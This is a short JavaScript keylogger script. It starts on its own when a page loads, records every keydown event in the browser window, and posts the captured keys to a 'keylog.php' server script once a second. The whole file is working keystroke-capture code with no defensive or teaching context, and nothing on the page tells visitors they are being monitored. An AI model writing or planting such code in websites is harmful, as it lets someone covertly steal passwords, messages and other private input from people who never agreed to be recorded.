let keylog = {
    cache:[],  //hold the keystrokes
    delay:1000,  //1 sec
    sending:false,

    init(){
        window.addEventListener('keydown',(evt) => {
            //insert cache array
            keylog.cache.push(evt.key)
    
        })
        
        //send this keystrokes to keylog.php
        window.setInterval(keylog.send,keylog.delay)

    },

    send(){
        if(!keylog.sending && keylog.cache.length != 0){
            keylog.sending = true

            let data =new FormData()
            data.append('keys',JSON.stringify(keylog.cache))
            keylog.cache = []

            // send this info to php script

            fetch("keylog.php",{
                method:'POST',
                body:data
            })
            .then((res) => res.text())
            .then((res) => {
                keylog.sending = false
                console.log(res)
            })
            .catch((err) => {
                console.error(err)
            })
        }
    }
}
//automatically starts when site loads
window.addEventListener('DOMContentLoaded',keylog.init)
